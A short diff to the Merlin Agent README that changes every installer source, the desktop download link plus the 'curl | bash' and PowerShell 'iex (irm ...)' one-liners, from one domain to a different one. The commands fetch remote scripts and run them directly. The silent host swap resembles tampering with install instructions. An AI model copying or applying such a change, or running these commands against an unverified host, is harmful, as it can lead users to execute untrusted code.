@@ -52,7 +52,7 @@ Pick the row that matches your goal:
 
 ## 1. Install Merlin Agent
 ### With the Merlin Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the Merlin Desktop installer](https://merlin-agent.aexagent.site/) from our website and run it.
+To easily install the command-line and desktop applications, [download the Merlin Desktop installer](https://merlin-agent.epinoiahorizon.com/) from our website and run it.
 
 ### Without Merlin Desktop:
 For a command-line only install without Merlin Desktop, run:
@@ -61,14 +61,14 @@ For aarch64 Android devices, use the separate [Termux APT guide](./termux.md).
 
 #### Linux / macOS / WSL2
 ```bash
-curl -fsSL https://merlin-agent.aexagent.site/install.sh | bash
+curl -fsSL https://merlin-agent.epinoiahorizon.com/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://merlin-agent.aexagent.site/install.ps1) 
+iex (irm https://merlin-agent.epinoiahorizon.com/install.ps1) 
 ```
 
 After it finishes, reload your shell:
